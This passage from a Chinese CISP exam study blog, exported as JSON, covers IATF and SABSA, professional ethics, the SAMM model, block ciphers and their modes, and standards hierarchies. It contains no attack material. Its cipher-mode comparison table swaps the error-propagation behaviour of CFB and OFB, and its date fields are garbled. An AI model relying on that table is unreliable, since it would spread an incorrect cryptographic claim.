时间 业务何时运行？ 业务时间要求 2.5 SABSA的应用 使用SABSA构建安全架构： SABSA应用流程： ├── 1. 战略层分析 │ ├── 识别业务目标 │ ├── 分析业务风险 │ ├── 定义安全目标 │ └── 确定业务需求 ├── 2. 概念层设计 │ ├── 制定安全策略 │ ├── 定义安全原则 │ ├── 设计安全服务 │ └── 建立概念模型 ├── 3. 设计层规划 │ ├── 设计安全架构 │ ├── 定义安全机制 │ ├── 规划安全流程 │ └── 建立逻辑模型 ├── 4. 实施层执行 │ ├── 选择技术方案 │ ├── 制定实施计划 │ ├── 部署安全措施 │ └── 配置安全系统 ├── 5. 组件层配置 │ ├── 选择具体产品 │ ├── 配置安全参数 │ ├── 集成安全组件 │ └── 测试验证 └── 6. 运营层管理 ├── 制定运营流程 ├── 监控安全状态 ├── 响应安全事件 └── 持续改进优化 三、IATF与SABSA对比 两个框架的对比： 特性 IATF SABSA 提出者 美国NSA Sherwood 类型 技术框架 架构框架 关注点 技术层面的安全保障 业务驱动的安全架构 结构 4个焦点领域 6层分层模型 维度 技术维度 纵向6层 + 横向6视角 起点 技术系统 业务需求 防御原则 多点防御、分层防御 层层递进、业务驱动 适用场景 技术系统安全设计 企业安全架构规划 优势 技术性强、实用性好 系统性强、覆盖全面 两个框架的互补性： 🤝 IATF与SABSA的结合IATF提供技术视角： 关注技术实现 提供具体的技术领域划分 指导技术层面的安全设计 SABSA提供架构视角： 关注业务需求 提供完整的架构方法论 指导从战略到实施的全过程 结合使用： SABSA用于整体架构规划 IATF用于技术层面设计 SABSA的设计层和实施层可以应用IATF的四个焦点领域 形成从业务到技术的完整安全体系 四、总结 信息安全保障框架的核心要点： IATF框架：四个焦点领域，多点防御和分层防御原则 SABSA模型：六层分层模型，业务驱动的安全架构 深度防御：在多个位置和多个层次部署安全控制 🎯 关键要点 IATF讨论信息系统的安全保护问题 IATF四个焦点领域：本地计算环境、区域边界、网络和基础设施、支持性基础设施 IATF推荐多点防御和分层防御原则 SABSA是一个六层分层模型 SABSA第一层从安全角度定义业务需求 SABSA从策略逐渐到技术和解决方案的实施实践 SABSA包括战略、概念、设计、实施、度量和审计层次的安全链条 SABSA每层抽象逐层减少，细节逐层增加 💡 实践建议 使用IATF指导技术层面的安全设计 应用多点防御原则在多个位置设防 应用分层防御原则在多个层次设防 使用SABSA规划企业安全架构 从业务需求出发设计安全体系 逐层细化从战略到实施的安全方案 结合IATF和SABSA形成完整的安全体系 建立覆盖技术、管理、流程的综合防御体系","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：职业道德准则","slug":"2025/10/CISP-Professional-Ethics-zh-CN","date":"un55fin55","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Professional-Ethics/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Professional-Ethics/","excerpt":"深入解析CISP职业道德准则，涵盖信息安全从业人员的职业规范和行为准则。","text":"作为信息安全从业人员，遵守职业道德准则是基本要求。CISP职业道德准则规范了信息安全专业人员的行为标准和职业操守。 一、CISP职业道德准则概述 1.1 职业道德的重要性 信息安全从业人员掌握着组织的核心信息资产和安全防护能力，职业道德直接关系到信息安全的有效性和可信度。 graph LR A[\"职业道德重要性\"] B[\"保护公众利益\"] C[\"维护行业声誉\"] D[\"确保专业可信\"] E[\"促进行业发展\"] A --> B A --> C A --> D A --> E B --> B1[\"保护用户权益\"] B --> B2[\"维护社会安全\"] C --> C1[\"树立专业形象\"] C --> C2[\"提升行业地位\"] D --> D1[\"建立信任关系\"] D --> D2[\"保证服务质量\"] E --> E1[\"知识共享\"] E --> E2[\"技术进步\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 1.2 职业道德准则框架 CISP职业道德准则的核心内容： graph TB A[\"CISP职业道德准则\"] B[\"保护公众利益\"] C[\"遵守法律法规\"] D[\"维护专业操守\"] E[\"持续专业发展\"] F[\"促进行业进步\"] A --> B A --> C A --> D A --> E A --> F style A fill:#e3f2fd,stroke:#1976d2 style B fill:#e8f5e9,stroke:#388e3d style C fill:#ffcdd2,stroke:#c62828 style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#c8e6c9,stroke:#2e7d32 二、职业道德准则详解 2.1 保护公众利益 🛡️ 保护公众利益核心要求： 抵制通过网络系统侵犯公众合法权益 保护用户隐私和数据安全 维护网络空间安全 促进信息安全意识 具体行为规范： ✅ 应该做的： 🛡️ 抵制通过网络系统侵犯公众合法权益 🔐 保护用户个人信息和隐私 📢 提高公众信息安全意识 🚨 及时报告发现的安全威胁 💡 推广安全最佳实践 ❌ 不应该做的： 🚫 侵犯用户隐私 🚫 泄露用户数据 🚫 利用职务便利谋取私利 🚫 参与或协助网络攻击 🚫 传播虚假信息 2.2 遵守法律法规 ⚖️ 遵守法律法规核心要求： 遵守国家法律法规 遵守行业规范标准 不从事违法活动 维护网络秩序 法律法规要求： 法律法规 主要要求 违反后果 网络安全法 保护网络安全，维护网络空间主权 行政处罚、刑事责任 数据安全法 保护数据安全，促进数据开发利用 行政处罚、刑事责任 个人信息保护法 保护个人信息权益 行政处罚、民事赔偿 刑法 禁止网络犯罪 刑事责任 具体行为规范： ✅ 应该做的： 📋 了解和遵守相关法律法规 🔍 在法律框架内开展工作 📢 不在计算机网络系统中进行造谣、欺诈、诽谤等活动 🚨 发现违法行为及时报告 📚 持续学习法律法规更新 ❌ 不应该做的： 🚫 从事网络犯罪活动 🚫 传播非法内容 🚫 侵犯知识产权 🚫 破坏网络系统 🚫 窃取商业秘密 ⚠️ 违反职业道德的行为通过公众网络传播非法软件是违反CISP职业道德准则的行为。 ❌ 为什么这是违反职业道德： 违反法律法规 侵犯知识产权 可能传播恶意软件 违反网络安全法 损害公众利益 可能危害用户安全 传播安全风险 破坏网络秩序 违背专业操守 不符合专业标准 损害行业声誉 破坏信任关系 2.3 维护专业操守 👔 维护专业操守核心要求： 保持专业能力 诚实守信 客观公正 保守秘密 专业操守要求： graph TB A[\"专业操守\"] B[\"专业能力\"] C[\"诚实守信\"] D[\"客观公正\"] E[\"保守秘密\"] A --> B A --> C A --> D A --> E B --> B1[\"持续学习\"] B --> B2[\"保持认证\"] C --> C1[\"如实报告\"] C --> C2[\"不夸大能力\"] D --> D1[\"独立判断\"] D --> D2[\"避免利益冲突\"] E --> E1[\"保护客户信息\"] E --> E2[\"遵守保密协议\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 具体行为规范： ✅ 应该做的： 📚 持续学习和提升专业能力 🎓 保持专业认证有效性 📊 如实报告安全状况 🔐 保护客户和雇主的机密信息 ⚖️ 客观公正地提供专业意见 🤝 避免利益冲突 ❌ 不应该做的： 🚫 夸大自己的能力和资质 🚫 隐瞒或歪曲安全问题 🚫 泄露客户机密信息 🚫 接受不当利益 🚫 在利益冲突情况下提供服务 2.4 持续专业发展 📈 持续专业发展核心要求： 持续学习新知识 跟踪技术发展 参与专业活动 分享经验知识 专业发展途径： 专业发展途径： ├── 正式教育 │ ├── 学历教育 │ ├── 专业培训 │ └── 认证考试 ├── 自主学习 │ ├── 阅读专业书籍 │ ├── 在线课程 │ └── 技术文档 ├── 实践经验 │ ├── 项目实践 │ ├── 安全测试 │ └── 事件响应 └── 交流分享 ├── 技术会议 ├── 专业论坛 └── 知识分享 具体行为规范： ✅ 应该做的： 📚 定期参加专业培训 🎓 保持和更新专业认证 📖 阅读最新技术文献 🤝 参与专业社区活动 💡 分享经验和知识 🔍 关注安全威胁动态 2.5 促进行业进步 🚀 促进行业进步核心要求： 帮助和指导同行 推动技术创新 参与标准制定 提升行业水平 具体行为规范： ✅ 应该做的： 🤝 帮助和指导信息安全同行提升信息安全保障知识和能力 💡 分享安全最佳实践 📢 参与安全意识宣传 📋 参与标准和规范制定 🔬 推动安全技术创新 🌐 促进国际交流合作 ❌ 不应该做的： 🚫 恶意竞争 🚫 诋毁同行 🚫 垄断技术知识 🚫 阻碍行业发展 三、职业道德准则对比分析 3.1 符合职业道德的行为 正确的职业行为： 行为 说明 符合准则 抵制侵犯公众权益 保护公众利益 ✅ 保护公众利益 不进行造谣欺诈 遵守法律法规 ✅ 遵守法律法规 帮助指导同行 促进行业进步 ✅ 促进行业进步 保护用户隐私 维护专业操守 ✅ 维护专业操守 持续学习提升 专业发展 ✅ 持续专业发展 3.2 违反职业道德的行为 错误的职业行为： 行为 违反准则 后果 传播非法软件 违反法律法规 法律责任、吊销认证 侵犯用户隐私 损害公众利益 法律责任、失去信任 泄露客户机密 违背专业操守 法律责任、职业禁入 参与网络攻击 违反法律法规 刑事责任 传播虚假信息 违反法律法规 行政处罚 🚨 严重违反职业道德的行为以下行为严重违反CISP职业道德准则： 通过公众网络传播非法软件 违反知识产权法 可能传播恶意软件 危害网络安全 利用职务便利进行网络攻击 违反网络安全法 滥用专业知识 严重损害公众利益 泄露客户或雇主的机密信息 违反保密义务 损害客户利益 破坏信任关系 参与或协助网络犯罪活动 违反刑法 危害社会安全 损害行业声誉 四、职业道德案例分析 4.1 案例一：软件传播 场景： 某CISP持证人员在公众网络上分享破解版安全工具。 分析： ❌ 违反知识产权法 ❌ 传播非法软件 ❌ 违反职业道德准则 ❌ 可能传播恶意软件 正确做法： ✅ 使用和推荐合法软件 ✅ 尊重知识产权 ✅ 引导用户使用正版软件 4.2 案例二：漏洞披露 场景： 发现某系统存在严重安全漏洞。 正确做法： ✅ 负责任地披露漏洞 ✅ 先通知厂商 ✅ 给予合理修复时间 ✅ 保护用户安全 错误做法： ❌ 公开披露未修复的漏洞 ❌ 利用漏洞谋取私利 ❌ 出售漏洞信息 4.3 案例三：客户信息 场景： 在为客户提供安全服务时获取了敏感信息。 正确做法： ✅ 严格保密客户信息 ✅ 仅在授权范围内使用 ✅ 遵守保密协议 ✅ 安全处理和销毁信息 错误做法： ❌ 泄露客户信息 ❌ 用于其他目的 ❌ 与他人分享 五、职业道德的执行和监督 5.1 自律机制 个人自律： 📋 定期自我审查 🎓 持续学习职业道德 🤝 接受同行监督 📢 主动报告违规行为 5.2 行业监督 监督机制： 🏢 认证机构监督 👥 同行评议 📋 投诉处理 ⚖️ 纪律处分 5.3 违规处理 处理措施： 违规程度 处理措施 示例 轻微违规 警告、教育 未及时更新知识 一般违规 暂停认证 夸大能力 严重违规 吊销认证 泄露机密 违法犯罪 法律追究 网络攻击 六、总结 CISP职业道德准则的核心要点： 保护公众利益：抵制侵犯公众权益的行为 遵守法律法规：不从事违法活动 维护专业操守：诚实守信、客观公正 持续专业发展：不断学习提升 促进行业进步：帮助指导同行 🎯 关键要点 职业道德是信息安全从业人员的基本要求 抵制侵犯公众权益的行为 不在网络中进行造谣、欺诈、诽谤等活动 通过公众网络传播非法软件违反职业道德 帮助和指导同行提升能力 保护客户和雇主的机密信息 持续学习和专业发展 💡 实践建议 定期学习职业道德准则 在工作中严格遵守职业规范 保护客户和用户的合法权益 使用和推广合法软件 负责任地披露安全漏洞 积极参与行业交流和知识分享 接受同行监督和自我审查","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：软件安全与SAMM模型","slug":"2025/10/CISP-Software-Security-SAMM-zh-CN","date":"un55fin55","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Software-Security-SAMM/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Software-Security-SAMM/","excerpt":"深入解析CISP认证中的软件保障成熟度模型（SAMM），涵盖软件开发安全的核心业务功能和最佳实践。","text":"软件保障成熟度模型（Software Assurance Maturity Model, SAMM）是评估和改进软件安全开发实践的框架，帮助组织构建安全的软件开发生命周期。 一、SAMM模型概述 1.1 什么是SAMM 📚 SAMM定义**软件保障成熟度模型（SAMM）**是一个开放的框架，用于帮助组织制定和实施适合其特定风险的软件安全策略。 核心目标： 评估组织的软件安全实践 构建平衡的软件安全保障计划 展示软件安全活动的具体改进 定义和衡量安全相关活动 1.2 SAMM的重要性 为什么需要SAMM： 🎯 提供结构化的安全改进路径 📊 可衡量的安全成熟度评估 🔄 持续改进的框架 🛡️ 降低软件安全风险 💼 符合合规要求 二、SAMM核心业务功能 2.1 四大核心业务功能 🎯 SAMM的四大核心业务功能SAMM定义了软件开发过程中的四个核心业务功能： 治理（Governance） 构造（Construction） 验证（Verification） 部署（Deployment） 注意：购置（Procurement）不是SAMM的核心业务功能！ graph TB A[\"SAMM核心业务功能\"] B[\"治理Governance\"] C[\"构造Construction\"] D[\"验证Verification\"] E[\"部署Deployment\"] A --> B A --> C A --> D A --> E B --> B1[\"策略与合规\"] B --> B2[\"教育与指导\"] B --> B3[\"威胁评估\"] C --> C1[\"威胁建模\"] C --> C2[\"安全需求\"] C --> C3[\"安全架构\"] D --> D1[\"架构评估\"] D --> D2[\"需求驱动测试\"] D --> D3[\"安全测试\"] E --> E1[\"漏洞管理\"] E --> E2[\"环境加固\"] E --> E3[\"运营使能\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 2.2 治理（Governance） 🏛️ 治理功能**定义：**主要是管理软件开发的过程和活动。 核心内容： 建立和维护安全策略 确保合规性 提供安全培训和指导 进行威胁评估 治理的三个安全实践： 安全实践 说明 关键活动 策略与合规 建立安全策略和标准 制定政策、合规检查、度量指标 教育与指导 提升安全意识和技能 安全培训、角色指导、安全文化 威胁评估 识别和评估威胁 威胁建模、风险评估、威胁情报 治理成熟度级别： 级别0：未实施 级别1：初步理解和临时实施 级别2：提高效率和有效性 级别3：全面掌握和规模化 2.3 构造（Construction） 🏗️ 构造功能**定义：**主要是在开发项目中确定目标并开发软件的过程与活动。 核心内容： 定义安全需求 设计安全架构 实施安全编码 进行威胁建模 构造的三个安全实践： 安全实践 说明 关键活动 威胁建模 识别和分析威胁 应用威胁建模、数据流分析、攻击面分析 安全需求 定义安全功能需求 需求收集、安全标准、供应商管理 安全架构 设计安全的系统架构 架构设计、技术选型、参考架构 构造阶段的关键点： ✅ 在设计阶段就考虑安全 ✅ 使用安全设计模式 ✅ 遵循安全编码标准 ✅ 实施纵深防御 2.4 验证（Verification） ✅ 验证功能**定义：**主要是测试和验证软件的过程和活动。 核心内容： 进行安全测试 代码审查 架构评估 需求验证 验证的三个安全实践： 安全实践 说明 关键活动 架构评估 评估架构安全性 架构审查、依赖分析、配置审查 需求驱动测试 基于需求的测试 控制验证、误用测试、边界测试 安全测试 发现安全漏洞 渗透测试、模糊测试、自动化扫描 验证方法： graph LR A[\"验证方法\"] B[\"静态分析\"] C[\"动态测试\"] D[\"人工审查\"] A --> B A --> C A --> D B --> B1[\"代码扫描\"] B --> B2[\"依赖检查\"] C --> C1[\"渗透测试\"] C --> C2[\"模糊测试\"] D --> D1[\"代码审查\"] D --> D2[\"架构审查\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 2.5 部署（Deployment） 🚀 部署功能**定义：**管理软件发布和运营的安全活动。 核心内容： 漏洞管理 环境加固 运营支持 事件响应 部署的三个安全实践： 安全实践 说明 关键活动 漏洞管理 识别和修复漏洞 漏洞跟踪、补丁管理、应急响应 环境加固 加固运行环境 配置管理、补丁更新、访问控制 运营使能 支持安全运营 监控日志、事件响应、变更管理 2.6 购置不是核心功能 ⚠️ 常见错误错误说法：购置（Procurement）是SAMM的核心业务功能之一。 ❌ 为什么这是错误的： SAMM只定义了四个核心业务功能：治理、构造、验证、部署 购置不在核心功能范围内 购置是供应链安全的一部分，但不是SAMM的核心业务功能 ✅ 正确理解： 购置活动在SAMM中体现在&quot;安全需求&quot;实践中 涉及第三方组件的安全评估 但不是独立的核心业务功能 购置与SAMM的关系： 购置活动 在SAMM中的体现 所属功能 供应商评估 安全需求 构造 第三方组件评估 架构评估 验证 开源组件管理 安全需求 构造 许可证合规 策略与合规 治理 三、SAMM成熟度模型 3.1 成熟度级别 SAMM定义了四个成熟度级别： graph TB A[\"成熟度级别\"] B[\"级别0未实施\"] C[\"级别1初步实施\"] D[\"级别2结构化实施\"] E[\"级别3优化实施\"] A --> B B --> C C --> D D --> E B --> B1[\"没有安全活动\"] C --> C1[\"临时的安全活动\"] D --> D1[\"系统化的安全活动\"] E --> E1[\"持续优化的安全活动\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#e3f2fd,stroke:#1976d2 成熟度级别详解： 级别 名称 特征 示例 0 未实施 没有相关活动 没有安全测试 1 初步实施 临时、非正式的活动 偶尔进行代码审查 2 结构化实施 标准化、可重复的活动 定期的安全测试流程 3 优化实施 持续改进、度量驱动 自动化安全测试和持续优化 3.2 评估和改进 SAMM评估流程： 当前状态评估 评估每个安全实践的成熟度 识别优势和差距 了解当前安全态势 目标设定 确定期望的成熟度级别 考虑业务需求和风险 制定改进路线图 实施改进 执行改进计划 分阶段实施 持续监控进展 度量和优化 跟踪关键指标 评估改进效果 持续优化 四、SAMM实施最佳实践 4.1 实施原则 核心原则： 🎯 风险驱动：基于组织的风险状况 📈 渐进式改进：分阶段提升成熟度 🔄 持续优化：建立持续改进机制 📊 度量驱动：使用指标跟踪进展 👥 全员参与：涉及所有相关角色 4.2 常见挑战 实施SAMM的常见挑战： 挑战 描述 应对策略 资源限制 人力和预算不足 优先处理高风险领域 文化阻力 开发团队抵触 加强培训和沟通 工具集成 安全工具难以集成 选择兼容性好的工具 度量困难 难以量化安全改进 建立明确的KPI 4.3 成功因素 SAMM成功实施的关键因素： ✅ 高层管理支持 ✅ 明确的目标和路线图 ✅ 充足的资源投入 ✅ 有效的培训计划 ✅ 持续的度量和反馈 ✅ 与开发流程的集成 五、总结 SAMM模型的核心要点： 四大核心业务功能：治理、构造、验证、部署（不包括购置） 治理：管理软件开发的过程和活动 构造：确定目标并开发软件的过程与活动 验证：测试和验证软件的过程和活动 部署：管理软件发布和运营的安全活动 🎯 关键要点 SAMM有四个核心业务功能，不是五个 购置不是核心业务功能，虽然它在软件安全中很重要 每个核心功能包含三个安全实践 成熟度分为0-3四个级别 实施应该是渐进式的、风险驱动的 💡 考试提示 记住SAMM的四大核心功能：治理、构造、验证、部署 购置虽然重要，但不是SAMM定义的核心业务功能 理解每个功能的主要职责和安全实践 了解成熟度级别的特征 相关资源： OWASP SAMM官方网站 SAMM模型文档","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：系统工程、密码算法与标准","slug":"2025/10/CISP-System-Engineering-Standards-zh-CN","date":"un55fin55","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-System-Engineering-Standards/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-System-Engineering-Standards/","excerpt":"深入解析CISP认证中的系统工程特点、分组密码算法和信息安全标准体系知识点。","text":"系统工程方法论、密码算法和标准体系是信息安全的重要基础知识。 一、系统工程 1.1 系统工程概述 系统工程的定义： 🏗️ 什么是系统工程系统工程是一种跨学科的工程方法，用于设计、实现和管理复杂系统的全生命周期。 核心思想： 🎯 整体性 从整体角度看待系统 考虑各部分之间的相互关系 追求整体最优而非局部最优 🔄 系统性 采用系统化的方法 遵循科学的流程 注重方法论 🤝 协同性 多学科协作 综合集成 知识共享 1.2 系统工程的特点 💡 系统工程特点的正确理解系统工程的核心特点： ✅ 自顶向下的设计方法 先决定整体框架 后进入详细设计 先确定系统整体架构 再逐步细化各个部分 ✅ 多学科协作 强调跨学科合作 根据问题涉及的学科和专业范围 组成知识结构合理的专家体系 形成互补的知识结构 ✅ 综合集成方法 以系统思想为指导 综合集成各学科、各领域的理论和方法 形成系统化的解决方案 ⚠️ 常见误区：分别独立研究 系统工程不是把研究对象分别独立研究 虽然分解为多个部分，但要综合考虑各部分的相互关系 强调整体性和关联性，而非独立性 各部分之间存在相互作用和依赖关系 系统工程的正确理解： graph TB A[\"系统工程方法\"] B[\"❌ 错误理解\"] C[\"✅ 正确理解\"] A --> B A --> C B --> B1[\"分别独立研究\"] B --> B2[\"各自为政\"] B --> B3[\"局部优化\"] C --> C1[\"综合考虑关联\"] C --> C2[\"协同配合\"] C --> C3[\"整体优化\"] B1 --> B1A[\"忽视相互关系\"] B2 --> B2A[\"缺乏协调\"] B3 --> B3A[\"整体次优\"] C1 --> C1A[\"考虑相互作用\"] C2 --> C2A[\"多方协作\"] C3 --> C3A[\"整体最优\"] style B fill:#ffcdd2,stroke:#b71c1c style C fill:#c8e6c9,stroke:#2e7d32 1.3 系统工程的基本特点 系统工程的四大特点： 系统工程的基本特点： ├── 1. 整体性 │ ├── 先决定整体框架 │ ├── 后进入详细设计 │ ├── 自顶向下设计 │ └── 追求整体最优 ├── 2. 综合性 │ ├── 分解为多个部分 │ ├── 综合考虑相互关系 │ ├── 注重部分间的协调 │ └── 整体大于部分之和 ├── 3. 跨学科性 │ ├── 多学科协作 │ ├── 知识结构合理 │ ├── 专家体系 │ └── 优势互补 └── 4. 方法论 ├── 系统思想指导 ├── 综合集成理论 ├── 科学方法 └── 标准化流程 系统工程的设计流程： graph TB A[\"系统工程设计流程\"] B[\"需求分析\"] C[\"整体架构设计\"] D[\"子系统设计\"] E[\"详细设计\"] F[\"集成测试\"] G[\"系统验证\"] A --> B B --> C C --> D D --> E E --> F F --> G C --> C1[\"确定整体框架\"] D --> D1[\"分解为子系统\"] E --> E1[\"详细设计各部分\"] F --> F1[\"集成各子系统\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#fce4ec,stroke:#c2185b style G fill:#ffebee,stroke:#c62828 1.4 系统工程在信息安全中的应用 信息安全系统工程方法： 🔒 信息安全系统工程应用系统工程方法构建安全体系： 1️⃣ 整体规划 确定安全目标和需求 设计整体安全架构 规划安全域和边界 2️⃣ 分层设计 物理安全层 网络安全层 系统安全层 应用安全层 数据安全层 3️⃣ 综合考虑 各层之间的关联 安全控制的协调 技术与管理结合 人员与流程配合 4️⃣ 持续改进 监控和评估 反馈和优化 动态调整 持续提升 深度防御示例： graph TB A[\"深度防御体系\"] B[\"边界防护\"] C[\"网络防护\"] D[\"主机防护\"] E[\"应用防护\"] F[\"数据防护\"] A --> B B --> C C --> D D --> E E --> F B --> B1[\"防火墙\"] C --> C1[\"IDS/IPS\"] D --> D1[\"主机加固\"] E --> E1[\"应用防火墙\"] F --> F1[\"加密存储\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#fce4ec,stroke:#c2185b style F fill:#ffebee,stroke:#c62828 二、分组密码算法 2.1 密码算法分类 密码算法的主要分类： graph TB A[\"密码算法\"] B[\"对称密码\"] C[\"非对称密码\"] D[\"哈希函数\"] A --> B A --> C A --> D B --> B1[\"分组密码\"] B --> B2[\"流密码/序列密码\"] B1 --> B1A[\"DES, AES, IDEA\"] B2 --> B2A[\"RC4, ChaCha20\"] C --> C1[\"RSA, ECC\"] D --> D1[\"MD5, SHA\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d 2.2 分组密码算法 💡 分组密码算法的正确理解分组密码算法的特征： ✅ 固定长度的输入块 要求输入明文按组分成固定长度的块 将明文分成固定大小的块 如DES是64位，AES是128位 ✅ 固定长度的输出块 每次计算得到固定长度的密文输出块 输出块大小与输入块相同 每个明文块对应一个密文块 ✅ 常见的分组密码算法 DES：64位分组 IDEA：64位分组 AES：128位分组 都是典型的分组密码 ⚠️ 常见误区：与序列密码混淆 分组密码和序列密码是两种不同的算法 分组密码（Block Cipher）：按固定大小的块加密 序列密码/流密码（Stream Cipher）：逐位或逐字节加密 两者是对称密码的两个不同分支 分组密码 vs 序列密码： 特性 分组密码 序列密码 英文名称 Block Cipher Stream Cipher 处理单位 固定长度的块 逐位或逐字节 典型算法 DES, AES, IDEA, 3DES RC4, ChaCha20, Salsa20 块大小 固定（如64位、128位） 1位或1字节 速度 相对较慢 通常较快 应用场景 文件加密、磁盘加密 流媒体、实时通信 填充 需要填充 不需要填充 错误传播 限于当前块 可能影响后续 2.3 常见分组密码算法 主要分组密码算法： 常见分组密码算法： ├── DES (Data Encryption Standard) │ ├── 块大小：64位 │ ├── 密钥长度：56位（实际64位，8位校验） │ ├── 状态：已不安全 │ └── 应用：已被淘汰 ├── 3DES (Triple DES) │ ├── 块大小：64位 │ ├── 密钥长度：112位或168位 │ ├── 状态：逐步淘汰 │ └── 应用：遗留系统 ├── AES (Advanced Encryption Standard) │ ├── 块大小：128位 │ ├── 密钥长度：128&#x2F;192&#x2F;256位 │ ├── 状态：当前标准 │ └── 应用：广泛使用 ├── IDEA (International Data Encryption Algorithm) │ ├── 块大小：64位 │ ├── 密钥长度：128位 │ ├── 状态：较安全 │ └── 应用：PGP等 └── SM4 (国密算法) ├── 块大小：128位 ├── 密钥长度：128位 ├── 状态：中国标准 └── 应用：国内系统 2.4 分组密码的工作模式 分组密码的常见工作模式： graph TB A[\"分组密码工作模式\"] B[\"ECB电子密码本\"] C[\"CBC密码块链接\"] D[\"CFB密码反馈\"] E[\"OFB输出反馈\"] F[\"CTR计数器\"] A --> B A --> C A --> D A --> E A --> F B --> B1[\"最简单不安全\"] C --> C1[\"常用需要IV\"] D --> D1[\"流模式自同步\"] E --> E1[\"流模式不自同步\"] F --> F1[\"并行随机访问\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#e8f5e9,stroke:#388e3d style D fill:#e3f2fd,stroke:#1976d2 style E fill:#fff3e0,stroke:#f57c00 style F fill:#f3e5f5,stroke:#7b1fa2 工作模式对比： 模式 全称 特点 优点 缺点 应用 ECB Electronic Codebook 独立加密每个块 简单、并行 不安全、模式泄露 不推荐 CBC Cipher Block Chaining 前一块影响后一块 安全性好 不能并行加密 文件加密 CFB Cipher Feedback 流模式、自同步 错误不传播 不能并行 流数据 OFB Output Feedback 流模式、预计算 可预计算 错误传播 流数据 CTR Counter 计数器模式 并行、随机访问 需要唯一计数器 磁盘加密 三、信息安全标准 3.1 标准的概念 标准的定义： 📋 什么是标准标准是在一定范围内为了获得最佳秩序，经协商一致制定并由公认机构批准，共同重复使用的一种规范性文件。 标准的特点： 📜 规范性 提供统一的规则和要求 具有权威性 需要遵守 🤝 协商一致 经过各方协商 达成共识 代表共同利益 🔄 重复使用 可以多次使用 适用于多个场景 具有通用性 3.2 标准的分类 💡 标准体系的正确理解标准的定义： 标准是在一定范围内为了获得最佳秩序，经协商一致制定并由公认机构批准，共同重复使用的一种规范性文件，标准是标准化活动的重要成果。 标准的层级关系： ✅ 行业标准 针对没有国家标准而又需要在全国某个行业范围统一的技术要求而制定 填补国家标准的空白 当行业标准和国家标准的条款发生冲突时，应以国家标准条款为准 ✅ 地方标准 由省、自治区、直辖市标准化行政主管部门制定 需要报国务院标准化行政主管部门和国务院有关行政主管部门备案 在公布国家标准后，该地方标准即应废止 ⚠️ 关于国际标准的常见误区 国际标准不一定是强制性标准 国际标准通常是推荐性的 当国家标准和国际标准的条款发生冲突时，应以国家标准为准 国家主权原则：各国有权制定符合本国国情的标准 标准的层级体系： graph TB A[\"标准体系\"] B[\"国际标准\"] C[\"国家标准\"] D[\"行业标准\"] E[\"地方标准\"] F[\"企业标准\"] A --> B A --> C A --> D A --> E A --> F B --> B1[\"ISO, IEC, ITU\"] C --> C1[\"GB, GB/T\"] D --> D1[\"行业代码+标准号\"] E --> E1[\"DB+地区代码\"] F --> F1[\"Q/企业代码\"] C --> C2[\"优先级最高\"] D --> D2[\"服从国家标准\"] E --> E2[\"服从国家标准\"] F --> F2[\"不低于国家标准\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#fce4ec,stroke:#c2185b 3.3 标准的性质 强制性标准 vs 推荐性标准： 特性 强制性标准 推荐性标准 标识 GB（国家标准） GB/T（国家标准推荐） 约束力 必须执行 自愿采用 适用范围 涉及安全、健康、环保等 一般技术要求 法律效力 具有法律效力 无强制法律效力 违反后果 可能承担法律责任 无法律责任 示例 安全标准、环保标准 技术规范、最佳实践 标准冲突时的优先级： 标准优先级（从高到低）： 1. 国家强制性标准（GB） 2. 国家推荐性标准（GB&#x2F;T） 3. 行业标准 4. 地方标准 5. 企业标准 冲突处理原则： ├── 国家标准 &gt; 行业标准 ├── 国家标准 &gt; 地方标准 ├── 国家标准 &gt; 企业标准 ├── 强制性标准 &gt; 推荐性标准 └── 国家标准公布后，相应的地方标准废止 3.4 信息安全相关标准 主要信息安全标准体系： 信息安全标准体系： ├── 国际标准 │ ├── ISO&#x2F;IEC 27001 - 信息安全管理体系 │ ├── ISO&#x2F;IEC 27002 - 